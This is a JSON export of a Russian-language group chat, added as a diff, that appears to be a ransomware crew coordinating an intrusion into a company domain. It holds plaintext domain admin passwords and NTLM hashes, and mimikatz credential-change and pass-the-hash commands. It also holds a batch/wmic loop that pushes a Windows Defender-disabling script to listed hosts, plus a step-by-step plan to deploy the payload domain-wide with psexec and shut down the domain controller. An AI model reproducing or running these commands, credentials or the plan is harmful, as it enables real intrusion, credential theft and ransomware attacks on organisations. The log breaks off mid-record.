@@ -1,0 +1,1487 @@
+{
+  "messages": [
+    {
+      "_id": "GSYt7gmNEN3Sp3yWp",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "не?",
+      "ts": "2020-10-21T23:42:23.906Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T23:42:23.934Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qvuABsZ2a3Rav7NH7",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nfor /f %%i in (ip.txt) do (copy wdoff.bat \\\\%%i\\C$\\ProgramData && wmic /node:%%i process call create \"cmd /c wdoff.bat\")\n```",
+      "ts": "2020-10-21T23:42:18.039Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T23:42:18.103Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XYjrbzm88AdiRKCoL",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\n10.0.0.25\n10.0.20.222\n10.10.0.118\n10.0.10.131\n10.0.0.24\n10.0.10.103\n10.0.10.96\n10.0.10.101\n10.0.10.134\n10.10.0.131\n10.0.10.133\n10.0.10.35\n10.0.20.231\n10.0.20.83\n10.10.0.134\n10.0.10.168\n10.0.10.116\n10.10.0.117\n10.10.0.135\n10.10.20.131\n10.0.10.111\n10.10.20.126\n10.0.10.126\n172.17.0.8\n10.0.10.129\n10.0.10.163\n10.0.10.93\n10.0.10.83\n10.10.0.103\n10.0.20.100\n10.0.10.143\n10.10.0.129\n10.0.10.9\n172.17.0.13\n10.0.10.139\n10.0.10.117\n10.0.10.12\n10.0.10.110\n172.17.0.13\n192.168.0.228\n192.168.0.69\n10.0.20.160\n192.168.5.114\n10.0.20.187\n10.0.10.137\n192.168.0.15\n10.0.10.91\n192.168.0.35\n10.0.10.125\n\n```",
+      "ts": "2020-10-21T23:40:18.430Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T23:40:18.763Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rzKbodB4jgpeFhcDz",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nNEW NTLM     : 04ddcbb1734a5a868580438cb75d7c2c\n```",
+      "ts": "2020-10-21T21:50:31.852Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T21:50:31.910Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "uEv5z7wx9rsZiuaLJ",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\npth ITC\\br_admin 555601b2d489ec2bfb7d189544736c8b\n \nmimikatz lsadump::changentlm /server:ITC.local /user:Administrator /old:0cc0cdacd8aa7f3b06e7cdfffa909b11 /newpassword:CAKE@horse369!@@321\n```",
+      "ts": "2020-10-21T21:46:57.253Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T21:50:59.753Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-21T21:50:59.751Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "oyrETtmt26KDZfbJ8",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "make_token itc.local\\br_admin CAKE@horse369!@@",
+      "ts": "2020-10-21T21:44:46.482Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T21:44:46.529Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "h4YoFeN7KykvmAEwJ",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": ".",
+      "ts": "2020-10-21T21:34:58.522Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T21:39:53.531Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-21T21:39:53.529Z",
+      "editedBy": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4"
+      },
+      "urls": []
+    },
+    {
+      "_id": "QP6XeZNywpRfBynHX",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nAdministrator            bkupsvc                  br_admin                 \nbu_veeam                 eagle                    egl_admin                \negladmin                 egltech                  nk_admin                 \nPassportalSync           paustin                  SLEAdmin                 \nsuperlogin               vmware                 aadsync \n```",
+      "ts": "2020-10-21T21:33:21.783Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T21:39:46.164Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-21T21:39:46.158Z",
+      "editedBy": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4"
+      },
+      "urls": []
+    },
+    {
+      "_id": "GRMmqvJnrHzsFKqsp",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "`mimikatz lsadump::changentlm /server:sprouselaw /user:aandaservice /old:1737a8ca4966a1b4cf767232b0a4bd58 /newpassword:jackc!76DF37bd`",
+      "ts": "2020-10-21T21:32:29.565Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T21:32:29.592Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "A6kgC22e6apYSCSH8",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "новый пароль для ДА `CAKE@horse369!@@321`",
+      "ts": "2020-10-21T21:30:26.306Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T21:30:26.349Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "SuuwY75JBzRiNJkN5",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "Все готово, начинаем?",
+      "ts": "2020-10-21T20:55:29.843Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T20:55:29.892Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hHSX4tGGXLzSrvoxr",
+      "rid": "smRZJpu2apfGvS6f9",
+      "ts": "2020-10-21T20:54:51.284Z",
+      "msg": "",
+      "file": {
+        "_id": "DJZrk4R9QzPYSLAdT",
+        "name": "Updater.exe",
+        "type": "application/x-ms-dos-executable"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "Updater.exe",
+          "title_link": "/file-upload/DJZrk4R9QzPYSLAdT/Updater.exe",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T20:54:51.343Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DFBJ2hekLvQ2g5i3S",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "План такой:\n```\n1. Отпинговываем живые WS\n2. Отключаем WinDef\n3. Раскидываем starter на WS + гасим малварь\n4. Раскидываем starter на серваки (в system32), кроме DC. На серверах, где есть SQL - руками останавливаем (net stop mssqlserver) или прибиваем процессы SQL. Запускаем starter руками.\n5. Запускаем starter domen-wide (psexec \\\\* -d  -s -h start.exe -accepteula -y)\n6. Гасим DC\n```",
+      "ts": "2020-10-21T20:54:06.095Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T20:54:06.190Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZiNs5eoWot9Cmyfsi",
+      "rid": "smRZJpu2apfGvS6f9",
+      "ts": "2020-10-21T20:46:14.700Z",
+      "msg": "",
+      "file": {
+        "_id": "6tjyxAb3pL6gD8ohu",
+        "name": "DCSync.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "DCSync.txt",
+          "title_link": "/file-upload/6tjyxAb3pL6gD8ohu/DCSync.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T20:46:14.730Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RHwDWWLHFLaS23ChY",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "EA:\n```\n\t* Username : egl_admin\n\t * Domain   : ITC\n\t * Password : E@gle@x1s3030\n``` \n\nDA:\n```\n\t* Username : br_admin\n\t * Domain   : ITC\n\t * Password : CAKE@horse369!@@\n```",
+      "ts": "2020-10-21T20:46:02.019Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T20:46:02.107Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WJhFeFLT2iDNLzZui",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "? или есть другой?",
+      "ts": "2020-10-21T20:38:04.093Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T20:38:04.136Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "2fCSwKCMjzbrqCNBG",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "Используем KCunZoziQUNQoJta54VhbE7Y8PD8FPDSGWulQ3gvxuiG7SFE4tGY4mHcaYmlFZM2",
+      "ts": "2020-10-21T20:37:52.439Z",
+      "u": {
+        "_id": "5nrWYoszLFsnLuMcN",
+        "username": "user3",
+        "name": "stalin"
+      },
+      "_updatedAt": "2020-10-21T20:37:52.471Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qX3zp9exDqEMwuc5q",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "107.161.126.162:15127 XloTvJNB",
+      "ts": "2020-10-21T20:08:32.381Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T20:08:32.424Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "DetR8P3rY94rTmseE",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "02:51 PM",
+      "ts": "2020-10-21T18:52:00.171Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-21T18:52:00.222Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jv7EGdNdc78NRMkfm",
+      "t": "room_changed_announcement",
+      "rid": "smRZJpu2apfGvS6f9",
+      "ts": "2020-10-21T18:42:00.460Z",
+      "msg": "",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "groupable": false,
+      "_updatedAt": "2020-10-21T18:42:00.461Z"
+    },
+    {
+      "_id": "gPuxqAsqpzNmu2yER",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "сразу time сюда",
+      "ts": "2020-10-21T18:35:43.661Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T18:35:43.698Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZWmxSpTxwq9X6Kk7z",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "отлично",
+      "ts": "2020-10-21T18:35:38.205Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T18:35:38.237Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LRdP56aoxrKXtefPr",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "вебрут не рубит наш экзешник\nmalwarebytes стоит на нескольких серверах(не облочный) - его деинсталл\nвсе\nшас свежий пинг и можно заканчивать",
+      "ts": "2020-10-21T18:35:06.629Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-21T18:35:06.670Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qgKRkGhs8pst3rmSL",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "так что у нас тут?",
+      "ts": "2020-10-21T18:19:42.272Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T18:19:42.319Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vLgHKn5BmJCDB5MkR",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "итд",
+      "ts": "2020-10-21T17:47:37.659Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-21T17:47:37.699Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "7ciYZG42gzW6XnvNC",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "так что можно любой список включая password\nsqlpassword\nsa\nsa1\nP@ssword",
+      "ts": "2020-10-21T17:47:37.195Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-21T17:47:37.236Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "foQGMjfZ7aMLup9fB",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "попробуй по тому популярных паролей\nкаких-то конкретных полиси обычно нету на \"sa\" акки",
+      "ts": "2020-10-21T17:47:22.499Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-21T17:47:22.541Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "898yJMCr5r5CyNe4g",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "-",
+      "ts": "2020-10-21T17:44:09.364Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T17:44:09.405Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kTuaE4XfPuqZxadP4",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "пробовал брутить \"sa\" аккаунты на скулях ?",
+      "ts": "2020-10-21T17:39:01.334Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-21T17:39:01.397Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3duAcsnN9SHDSA27W",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "```\nSQL Process:\n\tITC-SQL01.ITC.LOCAL\t\t\t10.0.0.16\n\tITCMA-SQL02.ITC.LOCAL\t\t10.0.0.81\n\tITC-SHIP01.ITC.LOCAL\t\t10.0.0.18\n\tITCMA-RDS01.ITC.LOCAL\t\t10.0.0.8\n\tITCMA-FILE01.ITC.LOCAL\t\t10.0.0.39\n\tITC-DC-SVR01.ITC.LOCAL\t\t10.0.0.14\n```",
+      "ts": "2020-10-21T15:02:01.223Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T15:02:01.343Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LCTiotbrGGL7Rjcpp",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "пока по остальным поработайте чуть чуть",
+      "ts": "2020-10-21T14:46:11.052Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-21T14:46:11.091Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "5sCrRx77Eav9JiiHy",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "ждем",
+      "ts": "2020-10-21T14:36:41.322Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T14:36:41.367Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "tfwTtdpeEWFk8wGJj",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "привет",
+      "ts": "2020-10-21T14:36:35.745Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T14:36:35.794Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Zz5aMHnAktdxLrxct",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "привет",
+      "ts": "2020-10-21T14:35:08.690Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-21T14:35:08.726Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RxKJuCiRhgkS8XJhT",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "сейчас @tl1 прийдет и начнем",
+      "ts": "2020-10-21T14:35:06.395Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-21T14:35:06.441Z",
+      "mentions": [
+        {
+          "_id": "yJcaRFnKQqepiffHq",
+          "username": "tl1",
+          "name": "Team Lead 1"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "9EJkyukkGEPvDijzS",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "@Tl1 @tl2",
+      "ts": "2020-10-21T14:31:12.644Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T14:31:12.678Z",
+      "mentions": [
+        {
+          "_id": "Rmne8eAkiu37dhm5z",
+          "username": "tl2",
+          "name": "Team Lead 2"
+        }
+      ],
+      "channels": []
+    },
+    {
+      "_id": "XXo9RjRg3dHAuKZ6Y",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "Ну что? Мы начинаем?",
+      "ts": "2020-10-21T14:23:21.970Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-21T14:23:22.011Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Dhm8GNLz4YD4oddcu",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "по рдп зашли на сервак посмотреть на малварь, не более",
+      "ts": "2020-10-21T02:00:29.249Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T02:00:29.288Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WmutNjGG93qFZjKMk",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "тут не шумели?",
+      "ts": "2020-10-21T01:59:34.232Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T01:59:34.276Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "pNrFta8RDzifmCkj3",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "мб по рдп зайти",
+      "ts": "2020-10-21T01:14:28.060Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T01:14:28.118Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ENqDaPqqSu4prTpy3",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "там идл тайм 7 часов",
+      "ts": "2020-10-21T01:14:24.494Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T01:14:24.544Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "54oQA5SRmZZdXBFZS",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "его локально не вырубить?",
+      "ts": "2020-10-21T01:14:20.017Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T01:14:20.054Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3TCDjHzPp7ammoEfg",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "эт ж не облачный",
+      "ts": "2020-10-21T01:14:11.140Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T01:14:11.176Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rvnC6bfN47zDzYu8X",
+      "rid": "smRZJpu2apfGvS6f9",
+      "ts": "2020-10-21T01:14:04.646Z",
+      "msg": "",
+      "file": {
+        "_id": "DvmfAyzidfSPQzh6b",
+        "name": "Clipboard - 21 октября 2020 г., 04:14",
+        "type": "image/png"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "Clipboard - 21 октября 2020 г., 04:14",
+          "title_link": "/file-upload/DvmfAyzidfSPQzh6b/Clipboard%20-%2021%20%D0%BE%D0%BA%D1%82%D1%8F%D0%B1%D1%80%D1%8F%202020%20%D0%B3.,%2004:14",
+          "title_link_download": true,
+          "image_dimensions": {
+            "width": 593,
+            "height": 114
+          },
+          "image_preview": "/9j/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAAGACADASIAAhEBAxEB/8QAGAABAAMBAAAAAAAAAAAAAAAAAAIEBQj/xAAfEAACAgEEAwAAAAAAAAAAAAAAAQIDEgURIUEUMXH/xAAUAQEAAAAAAAAAAAAAAAAAAAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8A6IhDKjLfnEtada3TKt9JgATW/iS+My67HB+k+ewAP//Z",
+          "image_url": "/file-upload/DvmfAyzidfSPQzh6b/Clipboard%20-%2021%20%D0%BE%D0%BA%D1%82%D1%8F%D0%B1%D1%80%D1%8F%202020%20%D0%B3.,%2004:14",
+          "image_type": "image/png",
+          "image_size": 21330,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T01:14:04.706Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xvgzuvsspP2wZPiri",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "а я говорю про запуск",
+      "ts": "2020-10-21T01:12:21.759Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T01:12:21.792Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "27wBYoztRu3c5Yfyq",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "при загрузке не ругается, проверяли",
+      "ts": "2020-10-21T01:12:04.023Z",
+      "u": {
+        "_id": "E7X3BDe2dXFsAHSz7",
+        "username": "user9",
+        "name": "voodoo"
+      },
+      "_updatedAt": "2020-10-21T01:12:04.059Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "NZKqjTqnq8Sy3gFhk",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "вебрут вроде не ругается на ехе",
+      "ts": "2020-10-21T01:11:41.439Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T01:11:41.483Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "j3dssD9gHE9xhgDRZ",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "а так по факту запуска",
+      "ts": "2020-10-21T01:09:48.369Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T01:09:48.404Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "LJ3SabQh2mCPTFAm9",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "облачная ебнет и на загрузке 90%",
+      "ts": "2020-10-21T01:09:43.465Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T01:09:43.495Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HofJ5bGRKG5HrLLhK",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "малварь рубанёт по факту загрузки или по запуску?",
+      "ts": "2020-10-21T01:07:49.687Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T01:07:49.721Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rvyatEC37xdPWr4x9",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "занимайтесь новыми",
+      "ts": "2020-10-21T01:02:41.443Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T01:02:41.479Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rrM9T7m9FTMkBKANg",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "ясно не думаю что успеем поэтому перенесем на завтра",
+      "ts": "2020-10-21T01:02:34.661Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T01:02:34.700Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "rC6K4M6xXpEgjSsHf",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "малварбайтс точно удалит",
+      "ts": "2020-10-21T01:01:11.208Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T01:01:11.262Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "eyTviosu6LkeKthLq",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "решите тут вопрос пожалуйста",
+      "ts": "2020-10-21T00:56:04.493Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-21T00:56:04.535Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fh9bhgBPiaNMAoTjw",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "всё",
+      "ts": "2020-10-21T00:29:51.437Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T00:29:51.476Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bQAMGfjE2d9Rww8Fd",
+      "rid": "smRZJpu2apfGvS6f9",
+      "msg": "ASITC-FILE01\n192.168.0.227\n```\n  DisplayName                    : Malwarebytes Anti-Malware version 1.80.2.1012\n  DisplayVersion                 : 1.80.2.1012\n  Publisher                      : Malwarebytes Corporation\n  InstallDate                    : 6/13/2019 12:00:00 AM\n  Architecture                   : x86\n\n  DisplayName                    : Malwarebytes Anti-Exploit version 1.13.2.283\n  DisplayVersion                 : 1.13.2.283\n  Publisher                      : Malwarebytes\n  InstallDate                    : 10/14/2020 12:00:00 AM\n  Architecture                   : x64\n```",
+      "ts": "2020-10-21T00:29:34.991Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-21T00:29:35.092Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
